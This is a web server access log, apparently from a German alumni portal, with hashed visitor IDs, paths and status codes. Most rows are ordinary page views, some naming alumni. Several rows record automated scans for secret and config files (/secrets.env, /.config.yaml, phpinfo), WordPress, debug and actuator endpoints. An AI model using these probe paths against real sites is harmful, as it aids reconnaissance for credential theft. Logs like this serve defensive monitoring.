user;timestamp;referer;target;method;status
9fb38cf23a674d53ead655351d152cbbcd6192f361eecf48f530fc31d55bc899;2025-11-26 02:58:40;;/.config.yaml;GET;404
9fb38cf23a674d53ead655351d152cbbcd6192f361eecf48f530fc31d55bc899;2025-11-26 02:58:40;;/.config.yaml;GET;404
9fb38cf23a674d53ead655351d152cbbcd6192f361eecf48f530fc31d55bc899;2025-11-26 02:58:41;;/secrets.env;GET;404
9fb38cf23a674d53ead655351d152cbbcd6192f361eecf48f530fc31d55bc899;2025-11-26 02:58:42;;/secrets.env;GET;404
9fb38cf23a674d53ead655351d152cbbcd6192f361eecf48f530fc31d55bc899;2025-11-26 02:58:44;;/debug/default/view?panel=config;GET;404
9fb38cf23a674d53ead655351d152cbbcd6192f361eecf48f530fc31d55bc899;2025-11-26 02:58:45;;/phpinfo.php;GET;404
9fb38cf23a674d53ead655351d152cbbcd6192f361eecf48f530fc31d55bc899;2025-11-26 02:58:45;;/debug/default/view?panel=config;GET;404
9fb38cf23a674d53ead655351d152cbbcd6192f361eecf48f530fc31d55bc899;2025-11-26 02:58:47;;/info/;GET;404
9fb38cf23a674d53ead655351d152cbbcd6192f361eecf48f530fc31d55bc899;2025-11-26 02:58:47;;/phpinfo.php;GET;404
9fb38cf23a674d53ead655351d152cbbcd6192f361eecf48f530fc31d55bc899;2025-11-26 02:58:48;;/info/;GET;404
9fb38cf23a674d53ead655351d152cbbcd6192f361eecf48f530fc31d55bc899;2025-11-26 02:58:50;;/test;GET;404
9fb38cf23a674d53ead655351d152cbbcd6192f361eecf48f530fc31d55bc899;2025-11-26 02:58:51;;/test;GET;404
d77d5fb305fe4efc3f8fe3924d95775943ffac6a0660eddf7a4e4b69f0329f07;2025-11-26 03:00:50;;/docs/img/gleichrichter.png;GET;404
c6f815cf1e24e7ddcf8d6056d055713d865fe1a6293f635144731c9dfc09f9e5;2025-11-26 03:03:17;/personen/alumni/details/sebastian-langhorst;/rechtliches/datenschutz;GET;200
242d0e9c32a13c08b150da7dbb44be25c356892ea858b72d633d3daa723c1104;2025-11-26 03:04:38;/personen/alumni/details/sebastian-langhorst;/personen/alumni/schule/5508;GET;200
f0b509a6017ac530a0763a0abc3e83edb93ef2c5d127169b5cbefdd4b6f3db72;2025-11-26 03:27:14;;/themen/details/wenn-sicherheit-sichtbar-wird;GET;200
b7217d69e8d0115bb190e4e14c6e43253cdf077156dab449d4a7433c7996b23e;2025-11-26 03:30:59;;/admin/config.php;GET;404
dda2344ddaa6cb18b4b587013b6c3c11b3544ebfa1e3d81b9322515d58b0f8b6;2025-11-26 03:37:06;/themen?category=community;/themen?category=community;GET;200
8841c6d8a686d8528fff47121fe2cd8ad5c774e94282d98867d12ee2db52dd5b;2025-11-26 03:41:31;;/themen/details/abschied-aus-moabit;GET;200
1b64654b82a7e332e74ed7735738a69668c5372f963d93597c2adc24bb352939;2025-11-26 03:46:43;/;/;GET;200
d90e1b61a8660c97e11dd9d0d347a50f4c4435960ed6e2e86217fc15a968841d;2025-11-26 03:53:19;;/sitemap.xml;GET;200
57419f856813934f349407347b5534d4b03a7aa9b57ee065612762308dc509ef;2025-11-26 04:12:15;;/;GET;200
5d805f0740041f39c329cf9634ba9cd4c8175fc53fbc96efc6594037872bc198;2025-11-26 04:21:06;/gruppen/hobby/abschlussfest;/gruppen/hobby/fotografie;GET;302
5d805f0740041f39c329cf9634ba9cd4c8175fc53fbc96efc6594037872bc198;2025-11-26 04:21:07;/gruppen/hobby/abschlussfest;/gruppen;GET;200
d86ea3c4cfc5e685076d09a7308f5d761982979e1338928619926e53115087b0;2025-11-26 04:23:43;;/;GET;200
8ab1b9165a0b227ddfe581c4ce7baf3bbad6a3d3b590e14e69394f641c565cf6;2025-11-26 04:34:41;/themen?category=kultur;/themen?category=kultur;GET;200
08bc5bc35f7a8e2308c21e3921c8f32aeeb61ec3e42447fccac9d2bb09dde080;2025-11-26 04:37:39;;/;GET;200
08bc5bc35f7a8e2308c21e3921c8f32aeeb61ec3e42447fccac9d2bb09dde080;2025-11-26 04:37:39;;//wp-includes/wlwmanifest.xml;GET;404
08bc5bc35f7a8e2308c21e3921c8f32aeeb61ec3e42447fccac9d2bb09dde080;2025-11-26 04:37:40;;//xmlrpc.php?rsd;GET;404
08bc5bc35f7a8e2308c21e3921c8f32aeeb61ec3e42447fccac9d2bb09dde080;2025-11-26 04:37:40;;/;GET;200
08bc5bc35f7a8e2308c21e3921c8f32aeeb61ec3e42447fccac9d2bb09dde080;2025-11-26 04:37:40;;//blog/wp-includes/wlwmanifest.xml;GET;404
08bc5bc35f7a8e2308c21e3921c8f32aeeb61ec3e42447fccac9d2bb09dde080;2025-11-26 04:37:40;;//web/wp-includes/wlwmanifest.xml;GET;404
08bc5bc35f7a8e2308c21e3921c8f32aeeb61ec3e42447fccac9d2bb09dde080;2025-11-26 04:37:40;;//wordpress/wp-includes/wlwmanifest.xml;GET;404
08bc5bc35f7a8e2308c21e3921c8f32aeeb61ec3e42447fccac9d2bb09dde080;2025-11-26 04:37:41;;//website/wp-includes/wlwmanifest.xml;GET;404
08bc5bc35f7a8e2308c21e3921c8f32aeeb61ec3e42447fccac9d2bb09dde080;2025-11-26 04:37:41;;//wp/wp-includes/wlwmanifest.xml;GET;404
08bc5bc35f7a8e2308c21e3921c8f32aeeb61ec3e42447fccac9d2bb09dde080;2025-11-26 04:37:41;;//news/wp-includes/wlwmanifest.xml;GET;404
08bc5bc35f7a8e2308c21e3921c8f32aeeb61ec3e42447fccac9d2bb09dde080;2025-11-26 04:37:41;;//2018/wp-includes/wlwmanifest.xml;GET;404
08bc5bc35f7a8e2308c21e3921c8f32aeeb61ec3e42447fccac9d2bb09dde080;2025-11-26 04:37:41;;//2019/wp-includes/wlwmanifest.xml;GET;404
08bc5bc35f7a8e2308c21e3921c8f32aeeb61ec3e42447fccac9d2bb09dde080;2025-11-26 04:37:42;;//shop/wp-includes/wlwmanifest.xml;GET;404
08bc5bc35f7a8e2308c21e3921c8f32aeeb61ec3e42447fccac9d2bb09dde080;2025-11-26 04:37:42;;//wp1/wp-includes/wlwmanifest.xml;GET;404
08bc5bc35f7a8e2308c21e3921c8f32aeeb61ec3e42447fccac9d2bb09dde080;2025-11-26 04:37:42;;//test/wp-includes/wlwmanifest.xml;GET;404
08bc5bc35f7a8e2308c21e3921c8f32aeeb61ec3e42447fccac9d2bb09dde080;2025-11-26 04:37:42;;//media/wp-includes/wlwmanifest.xml;GET;404
08bc5bc35f7a8e2308c21e3921c8f32aeeb61ec3e42447fccac9d2bb09dde080;2025-11-26 04:37:43;;//wp2/wp-includes/wlwmanifest.xml;GET;404
08bc5bc35f7a8e2308c21e3921c8f32aeeb61ec3e42447fccac9d2bb09dde080;2025-11-26 04:37:43;;//site/wp-includes/wlwmanifest.xml;GET;404
08bc5bc35f7a8e2308c21e3921c8f32aeeb61ec3e42447fccac9d2bb09dde080;2025-11-26 04:37:43;;//cms/wp-includes/wlwmanifest.xml;GET;404
08bc5bc35f7a8e2308c21e3921c8f32aeeb61ec3e42447fccac9d2bb09dde080;2025-11-26 04:37:43;;//sito/wp-includes/wlwmanifest.xml;GET;404
f5d643f705a901f12f74091b10d7aee086533cfd4c4e8d0471e12519f590412d;2025-11-26 04:44:44;/;/;PROPFIND;405
d5f087237eba114eafa57a154fe8e12624d1fbeba976cd9f788dccd6f0ee491d;2025-11-26 04:50:12;;/;GET;200
10d8a6a3df6d5cb65bf327f3a00ae98c08404f5b2a09d9870b918fbd418604a9;2025-11-26 04:54:50;;/;GET;200
0c345e32195a0a6d21b13b1cdb803944959f52e267dda600613012cf45620b22;2025-11-26 04:55:11;;/;GET;200
0c345e32195a0a6d21b13b1cdb803944959f52e267dda600613012cf45620b22;2025-11-26 04:55:14;;/sitemap.xml;GET;200
0db28e5cd9753fc20a89d6c3cc73afc769946358fc5d334d6d77c695e95a5c6c;2025-11-26 05:07:32;;/developmentserver/metadatauploader;GET;404
242d0e9c32a13c08b150da7dbb44be25c356892ea858b72d633d3daa723c1104;2025-11-26 05:08:27;/gruppen/hobby/abschlussfest;/gruppen/hobby/biologie;GET;302
242d0e9c32a13c08b150da7dbb44be25c356892ea858b72d633d3daa723c1104;2025-11-26 05:08:28;/gruppen/hobby/abschlussfest;/gruppen;GET;200
974b24cb599cdaca7088f2c4e2128012c81ac29dd14b51ad4d2b1849540aa8a2;2025-11-26 05:10:12;;/;GET;200
36b7b73e115bcf8095506612fbbfcf26d87042c20925e337ba72f36cd8dc079c;2025-11-26 05:15:37;;/;GET;200
c62e41d5f5aa18b6450daca438fcd13a0753236baf3b6b35333d4b091dd9bc8f;2025-11-26 05:29:09;;/veranstaltungen/details/sommerfest-am-treptow-kolleg;GET;200
ebf07fbebbaf6b18ab7315bd48406b44ebb680ff7b450ac2384d3d10ba97d3cb;2025-11-26 05:29:18;/personen/alumni/details/sebastian-langhorst;/personen/alumni/schule/9004;GET;200
56c00389a9884a04b2c3c1fd6eafd9d14a3de8ce0f683c4452f0f2eb47aa9dd2;2025-11-26 05:30:43;/gruppen/hobby/abschlussfest;/gruppen/hobby/tanzen;GET;302
56c00389a9884a04b2c3c1fd6eafd9d14a3de8ce0f683c4452f0f2eb47aa9dd2;2025-11-26 05:30:45;/gruppen/hobby/abschlussfest;/gruppen;GET;200
3ac5acbcc0a78a9717bd06364bfdd60e4be0806eea33d2f464833059de848c2d;2025-11-26 05:32:17;/themen/details/stipendien-fur-den-zweiten-bildungsweg;/themen/details/stipendien-fur-den-zweiten-bildungsweg;GET;200
4cbf07e5c0d9b72b93084a38117185266e12548519bd52093284c99b6d389aef;2025-11-26 05:42:54;/;/;GET;200
df510657f875274ae7bca76013926d063455a569b54fbfb9846f56734f6be5f0;2025-11-26 05:44:00;;/;GET;200
4b0896cff68196e785925c1cb6de7835a038141fb896cfccb804511f4b0dcb4b;2025-11-26 05:51:34;;/;GET;200
4b0896cff68196e785925c1cb6de7835a038141fb896cfccb804511f4b0dcb4b;2025-11-26 05:52:41;;/;GET;200
4b0896cff68196e785925c1cb6de7835a038141fb896cfccb804511f4b0dcb4b;2025-11-26 05:52:45;;/;GET;200
4b0896cff68196e785925c1cb6de7835a038141fb896cfccb804511f4b0dcb4b;2025-11-26 05:52:45;;/;GET;200
2dfc11274204fd687575b3ad8239b55fe22accf91613b4e7edf800257744d053;2025-11-26 06:02:45;;/themen/details/abschied-aus-moabit;GET;200
14265c540af84b97b6b817b4b4d1207abacc26118ed34596f5c5d0683ac47c07;2025-11-26 06:04:54;;/;GET;200
917e2ce768ddd61971f81829609fcabe5b1ae4d9b166b1a15e10571d4eea8434;2025-11-26 06:06:37;;/;GET;200
2278498d9791d8de095904fab90516ce70d8ea5b44108f0ba1fede1782894c69;2025-11-26 06:08:48;;/dns-query?dns=BAsBAAABAAAAAAAAB2V4YW1wbGUDY29tAAABAAE;GET;404
2278498d9791d8de095904fab90516ce70d8ea5b44108f0ba1fede1782894c69;2025-11-26 06:08:53;;/dns-query?name=example.com&type=A;GET;404
2278498d9791d8de095904fab90516ce70d8ea5b44108f0ba1fede1782894c69;2025-11-26 06:08:58;;/dns-query?dns=NWkBAAABAAAAAAAAB2V4YW1wbGUDY29tAAABAAE;GET;404
2278498d9791d8de095904fab90516ce70d8ea5b44108f0ba1fede1782894c69;2025-11-26 06:09:09;;/dns-query?name=example.com&type=A;GET;404
2278498d9791d8de095904fab90516ce70d8ea5b44108f0ba1fede1782894c69;2025-11-26 06:09:22;;/query?dns=KcwBAAABAAAAAAAAB2V4YW1wbGUDY29tAAABAAE;GET;404
2278498d9791d8de095904fab90516ce70d8ea5b44108f0ba1fede1782894c69;2025-11-26 06:09:44;;/query?name=example.com&type=A;GET;404
f8fe34bf5eb31f0e616e3cf11baf5b0ce203c13c48bacba8997dd78692133dc2;2025-11-26 06:11:51;;/;GET;200
4b0896cff68196e785925c1cb6de7835a038141fb896cfccb804511f4b0dcb4b;2025-11-26 06:18:17;;/;GET;200
4b0896cff68196e785925c1cb6de7835a038141fb896cfccb804511f4b0dcb4b;2025-11-26 06:21:49;;/;GET;200
66bdc8c9c5ff3a5e44344b9daa8210bfbb5f039befd207b80d0eac87fe95ca91;2025-11-26 06:29:54;/themen?category=wissenschaft;/themen?category=wissenschaft;GET;200
4b0896cff68196e785925c1cb6de7835a038141fb896cfccb804511f4b0dcb4b;2025-11-26 06:30:42;;/;GET;200
4b0896cff68196e785925c1cb6de7835a038141fb896cfccb804511f4b0dcb4b;2025-11-26 06:30:42;;/;GET;200
4b0896cff68196e785925c1cb6de7835a038141fb896cfccb804511f4b0dcb4b;2025-11-26 06:30:57;;/;GET;200
fc1a8e402e7aa3a1a288cb26973f158ba7ef1c640a0ffbdafd7656dd6adc147f;2025-11-26 06:47:28;;/;GET;200
e09688c9865b1a1abdea7004628f9e9c729f52011da9571188194e84cd98903a;2025-11-26 06:51:38;;/;GET;200
994cdf2a9d87f4b65f7101e01398e535979a38850f3f6189287ff80bc3b1b52a;2025-11-26 06:51:43;;/;GET;200
4cbf07e5c0d9b72b93084a38117185266e12548519bd52093284c99b6d389aef;2025-11-26 06:53:22;;/;GET;200
03e84a370cd3c57dd019628bff8d0c70f2e0d36c44daecf213c5b89fdf04de8a;2025-11-26 07:08:19;;/;GET;200
f558eb5f09f94ec55fcf61a154755e1f5c10bf6bcf1df5ceadac78b0854f3807;2025-11-26 07:09:55;;/gruppen;GET;200
03e84a370cd3c57dd019628bff8d0c70f2e0d36c44daecf213c5b89fdf04de8a;2025-11-26 07:13:27;;/webui/;GET;404
29d4330766a9f8f38641ddff315932cf37e2d017aa4328c52ce33bfbff0453b0;2025-11-26 07:18:13;;/;GET;200
29d4330766a9f8f38641ddff315932cf37e2d017aa4328c52ce33bfbff0453b0;2025-11-26 07:18:24;;/;GET;200
332ba7a92405cc263d9b6d575c96519d7339b45804c7ead6688993d086fbe061;2025-11-26 07:19:46;;/;GET;200
02e2f1393eb797f954fde586da58e8b3b44e5dbdecaba0160b1020eba89f1e91;2025-11-26 07:21:20;;/?XDEBUG_SESSION_START=phpstorm;GET;200
2360b72e32171da3897e81c2fe7896bc41c209228cb3fb1fd665945c9a8730c5;2025-11-26 07:27:48;/themen/details/erfolgreich-durch-die-abiturprufungen;/themen/details/erfolgreich-durch-die-abiturprufungen;GET;200
0bbfd6013794c68ba73c50ff2f88ac04bb8781a55784b4905caeec11298c4d41;2025-11-26 07:27:55;;/;GET;200
d9935b3e7fd70a2cea19515c08047a37c1d2ed30c2dae4812454cd4a23d2805d;2025-11-26 07:28:06;;/themen/details/wenn-sicherheit-sichtbar-wird;GET;200
03e84a370cd3c57dd019628bff8d0c70f2e0d36c44daecf213c5b89fdf04de8a;2025-11-26 07:33:00;;/geoserver/web/;GET;404
ba40ae471b350d0054ce3293bf1fad7836739f6b679738e5cd2b92a52dfb7534;2025-11-26 07:46:22;;/themen/details/david-gegen-goliath;GET;200
5d06ed8cfcc2fc53c12800f0a1931005367a4917c066e5e22a2a591e0fb0cb1a;2025-11-26 07:48:14;/;/;PROPFIND;405
7da266274949daedf4b5b4c1ddadcb523cd936f0a5607c33f28010a1ff130ae6;2025-11-26 07:48:15;;/;GET;200
628473e50eac71263462a0b958229f44bf3417c4225334b8b45d39d527abe670;2025-11-26 08:01:17;/login;/login;GET;200
628473e50eac71263462a0b958229f44bf3417c4225334b8b45d39d527abe670;2025-11-26 08:01:24;/login;/login;GET;200
628473e50eac71263462a0b958229f44bf3417c4225334b8b45d39d527abe670;2025-11-26 08:01:31;/login;/login;GET;200
0b3cea73c9b29742108d21a8bd7556dc9f7cdb766a897cef8b3c087e56036826;2025-11-26 08:08:45;;/veranstaltungen/details/sommerfest-am-treptow-kolleg;GET;200
c52c62fa6623376e0c7338d2d93be99602756268e3905872a5ce39ca56b20b49;2025-11-26 08:17:35;;/favicon.192x192.png;GET;404
a9dfab883557e3177f55d447bc107d59ff9cd7ecb5151eb7e51a769cb4f440eb;2025-11-26 08:19:34;;/;GET;200
af679e4e7aee756679a7218148e496fd2cb27ab4210a36fe646c1b0ed5cc0f99;2025-11-26 08:25:05;/themen/details/wenn-sicherheit-sichtbar-wird;/themen/details/wenn-sicherheit-sichtbar-wird;GET;200
f0c3aafa2979d3e013ac78f451319a4cea70dccda4157b9bd8e88fea676d3e0e;2025-11-26 08:31:30;;/;GET;200
34af1be451c29605cf296d08516cee74703accf2e0212bfe46e0f704a612d39a;2025-11-26 08:37:07;;/;GET;200
5023a630cb347439d408aa5d23d25b95467b5d8bd177a87c43a40a6beed8b29c;2025-11-26 08:38:41;/;/;GET;200
9370540c9ca1312bad46ff9ceaa69ba76e8fcf62e5ad9705c68242df8be6857f;2025-11-26 08:42:31;;/;GET;200
0205bdd6d5bac43b17c98ebdbf19d307e5579b0e1f1985629b4c2d1239a58edd;2025-11-26 08:44:49;;/themen/details/uni-zwischen-ebbe-und-flut;GET;200
4358fc79803fbdfd5997aa0b75b1bcad6d376b63cad1f260a4eef1de6f198b84;2025-11-26 08:49:18;;/;GET;200
242d0e9c32a13c08b150da7dbb44be25c356892ea858b72d633d3daa723c1104;2025-11-26 08:49:59;/aktuelles/meldungen/details/start-der-open-beta-jetzt-anmelden-und-testen;/aktuelles/meldungen?category=community;GET;200
dff02c98e5082040ee55831bf19ae7ba14ec994fc75a9291b84bd742ae493388;2025-11-26 08:51:05;;/;GET;200
d0a0e926dbd1bebe304e465cb407ed6babfe146cc50357b0c3dfe75f8fa93b8a;2025-11-26 08:51:13;;/;GET;200
3d0295db4aa80e3bcbbb2240f63950d84e07e32935cf82da0a12830ddc10da70;2025-11-26 08:54:11;/;/;GET;200
3839dc55bf51098b1d4c96fafbf341de7ec058b0bb1626ebb3b2ca1b0eed5904;2025-11-26 08:58:21;;/;GET;200
9545c81adbb78868bd26f153d9525fce2cc6ac856f25454ca71af7b9addc0c75;2025-11-26 09:11:48;;/aktuelles/stellenangebote;GET;200
21e3bade17fbd1cbdb5ffbcf125a9ccae2cc3cd7ed4b01eb06e98ac1e077b76b;2025-11-26 09:12:32;;/themen/2;GET;200
ecc49ca8cddabf4d26ef0b8fb665f7d2b6ae33a3e812cee16af7f75dba1fcf3a;2025-11-26 09:14:58;;/;GET;200
9ac316d17482f905a4154af3a71744034fde338b4cdd3365cccfaae71e6d9e10;2025-11-26 09:16:00;;/themen?category=politik;GET;200
6a525f05deb3d5353019d0f87fe621a597124005e2ab21e809e362f38178cda6;2025-11-26 09:18:52;;/;GET;200
62fa057b2c5214ae1bb2e174a0b11433ce8f828d136f1b05f13ef530303ca67f;2025-11-26 09:19:57;;/xmlrpc.php;GET;404
f25d942790670374220ba68ae65b881a10e223fc1625feed5054ba9cfca62bf0;2025-11-26 09:22:42;/themen/details/fotografie-als-kunst-und-ausdruck;/themen/details/fotografie-als-kunst-und-ausdruck;GET;200
ced65e15dca8b02424662bbd0e84c97e08ea85b8ec87dfe13e9dad75e634e339;2025-11-26 09:25:15;;/module/admin.fe;GET;404
6da684d88bf7ee04b7d0dace8c20402492572d32e8d270604b62d85a6fd7c0d5;2025-11-26 09:26:13;/;/;GET;200
02e2f1393eb797f954fde586da58e8b3b44e5dbdecaba0160b1020eba89f1e91;2025-11-26 09:27:33;;/actuator/gateway/routes;GET;404
649cb1fae6a12631c906c95888b451be35c8e3e46397a5bcb3b4104c91a5fb39;2025-11-26 09:30:41;/;/personen/alumni/details/thomas-matzig;GET;200
39078288b825b2a2383be8182e070b1d0aa3f20217247ad5d37843fd3dc16946;2025-11-26 09:33:28;;/;GET;200
39078288b825b2a2383be8182e070b1d0aa3f20217247ad5d37843fd3dc16946;2025-11-26 09:34:02;;/;GET;200
3b3084775ec3135d94b7a63767ae7d833481a8f7275f1fed99c80e7179b6aa54;2025-11-26 09:46:11;;/personen/alumni/details/asja-apelt-genannt-henze;GET;200
45b8e366f722b8139a62eec691507511bce5a3a5ea3ef6a2de718b0f7284b058;2025-11-26 09:52:35;/;/;GET;200
c9b50cb93a29365ba7f8837a829446ed80d2144d78245f77e1788e4d5cd7fe7c;2025-11-26 09:57:19;;/;GET;200
86424732828c477f72c05fe748b3353bab769375d35de2cee9a1b928873a21b4;2025-11-26 10:00:59;;/;GET;200
463897c2a35435e2ec806610c565ebda8c29df0345aeaff5f55d6c524862d6cd;2025-11-26 10:08:05;;/sitemap.xml;GET;200
bbcc7c5ded92fa754a73b4713481bc6fbf1207b890e838a632196b3ee8e38747;2025-11-26 10:19:19;;/;GET;200
9007a0196914ca937a02420c623c5e0bdf6051526516ac5e901d27f7420bb7d5;2025-11-26 10:20:18;/reset-password;/reset-password;GET;200
8bc49266678074d7689cd0523c1795889570f6f321da19c6d273901c099c231c;2025-11-26 10:22:14;;/;GET;200
eb6a6e3a1831975e9960a898cb81b673360ee2687c69e15506ceb18c45148aa7;2025-11-26 10:25:41;;/;GET;200
5d805f0740041f39c329cf9634ba9cd4c8175fc53fbc96efc6594037872bc198;2025-11-26 10:31:11;/personen/alumni/details/sebastian-langhorst;/personen/alumni/schule/04A04;GET;200
9fb41a111a7583422e066521d5bf29ad592b12a22e9f2e3d37db940781a75ffe;2025-11-26 10:32:38;/gruppen/hobby/abschlussfest;/gruppen/interesse/entrepreneurship;GET;200
8583b6da3f10a94565386889432403fafe4a2b4813e30bb3b0a513a2422bd982;2025-11-26 10:41:10;/;/;GET;200
242d0e9c32a13c08b150da7dbb44be25c356892ea858b72d633d3daa723c1104;2025-11-26 10:42:29;/personen/alumni/details/sebastian-langhorst;/aktuelles/stellenangebote;GET;200
7a1dd6bf7f68efa7bdf85d9a71a7398d3168d5d7b14cf023ccedc46d49fa287b;2025-11-26 10:42:34;;/themen/details/stipendien-fur-den-zweiten-bildungsweg;GET;200
c52c62fa6623376e0c7338d2d93be99602756268e3905872a5ce39ca56b20b49;2025-11-26 10:51:34;;/gruppen/interesse/datenanalyse-und-forschung;GET;200
c52c62fa6623376e0c7338d2d93be99602756268e3905872a5ce39ca56b20b49;2025-11-26 10:52:07;;/themen?category=community;GET;200
f1d945632b62a87dd3964364d777e2e68c7457f97d87214bbb4b1fa3e7a38e27;2025-11-26 10:53:54;;/;GET;200
7a1dd6bf7f68efa7bdf85d9a71a7398d3168d5d7b14cf023ccedc46d49fa287b;2025-11-26 11:06:30;;/gruppen/interesse/teamarbeit;GET;200
52ecc86b103debe299c2161826ae320cd2dc3372c4c5b65e8b395e955b9dbe43;2025-11-26 11:17:54;/personen/all/2;/personen/all/2;GET;200
5d805f0740041f39c329cf9634ba9cd4c8175fc53fbc96efc6594037872bc198;2025-11-26 11:22:14;/personen/alumni/details/sebastian-langhorst;/personen/alumni/schule/170574;GET;200
5d805f0740041f39c329cf9634ba9cd4c8175fc53fbc96efc6594037872bc198;2025-11-26 11:23:37;/gruppen/hobby/abschlussfest;/gruppen/hobby/malen-und-zeichnen;GET;302
5d805f0740041f39c329cf9634ba9cd4c8175fc53fbc96efc6594037872bc198;2025-11-26 11:23:38;/gruppen/hobby/abschlussfest;/gruppen;GET;200
a8f2c145316b032bfdab21a0f208d2cc6fd3d6f7c4d15498fa00934df568504a;2025-11-26 11:27:32;;/tr/?xcx;GET;404
be46f0a5a111a15879fa98b63bc94ec0f9cd1f46cb4f92af7d7a6aca073189ee;2025-11-26 11:28:15;;/aktuelles/stellenangebote;GET;200
9d0e8f39923bcda4cfe662cd328f20f0b7c38e928bd55147d04ab9f72b1bb9ed;2025-11-26 11:28:31;;/themen/details/der-start-ins-studium;GET;200
160c01aba35a2ad078f67888468378ca0429b38f1893a0071fd7a6daac8d850f;2025-11-26 11:28:47;;/themen/details/abschied-aus-moabit;GET;200
181d2c03a291d1b612c9c907d2fe10293885792f22317334bf3c4f9f81dc4bfb;2025-11-26 11:29:02;;/aktuelles/meldungen/details/alumni-portal-des-zbw-geht-an-den-start;GET;200
5ebc4e91a4f09b727940a56f9646d62673f8771800ee1f294ea21e2b68a73696;2025-11-26 11:29:17;;/aktuelles/meldungen/details/start-der-open-beta-jetzt-anmelden-und-testen;GET;200
160c01aba35a2ad078f67888468378ca0429b38f1893a0071fd7a6daac8d850f;2025-11-26 11:29:34;;/aktuelles/meldungen/details/hackerangriff-lauft-ins-leere;GET;200
a583ae46c30374aa9456b138dc57f68fcc4fb622f9e13551ee7f079069739fdd;2025-11-26 11:32:10;;/gruppen;GET;200
7a1dd6bf7f68efa7bdf85d9a71a7398d3168d5d7b14cf023ccedc46d49fa287b;2025-11-26 11:36:16;;/personen/alumni/details/cynthia-ott;GET;200
e4904105844cecd5f84a89b3b88c492038ca9229d9f0379cc71812acc0c7942c;2025-11-26 11:36:35;;/;GET;200
e5f108e496fc21f38688c1e1d65f683962e635f7badff987b0dc7c87c6f77194;2025-11-26 11:37:01;;/personen/alumni/details/andie-jahnke;GET;200
c52c62fa6623376e0c7338d2d93be99602756268e3905872a5ce39ca56b20b49;2025-11-26 11:41:59;;/personen/alumni/details/benjamin-voigt;GET;200
7a1dd6bf7f68efa7bdf85d9a71a7398d3168d5d7b14cf023ccedc46d49fa287b;2025-11-26 11:46:17;;/personen/alumni/details/sami-teuchert;GET;200
7a1dd6bf7f68efa7bdf85d9a71a7398d3168d5d7b14cf023ccedc46d49fa287b;2025-11-26 11:48:49;;/themen/details/start-der-open-beta-jetzt-anmelden-und-testen;GET;200
44b8d2f2e8a2f49b4ed2802c24d75ef00c7160cfad82c3b2144866caf0e90acb;2025-11-26 11:49:49;;/;GET;200
c52c62fa6623376e0c7338d2d93be99602756268e3905872a5ce39ca56b20b49;2025-11-26 11:52:24;;/themen?category=kultur;GET;200
7a1dd6bf7f68efa7bdf85d9a71a7398d3168d5d7b14cf023ccedc46d49fa287b;2025-11-26 11:52:34;;/themen/details/fotografie-als-kunst-und-ausdruck;GET;200
04216ce87311113e0c18d15530a53d41dcc4cb9b0029ee7ada7cffa03a29cfc1;2025-11-26 11:52:43;;/;GET;200
c52c62fa6623376e0c7338d2d93be99602756268e3905872a5ce39ca56b20b49;2025-11-26 11:54:09;;/gruppen/plausch/schulband-statt-fliessband;GET;302
e5f108e496fc21f38688c1e1d65f683962e635f7badff987b0dc7c87c6f77194;2025-11-26 11:54:10;;/gruppen/hobby/musikinstrumente-spielen;GET;302
7a1dd6bf7f68efa7bdf85d9a71a7398d3168d5d7b14cf023ccedc46d49fa287b;2025-11-26 11:54:11;;/gruppen;GET;200
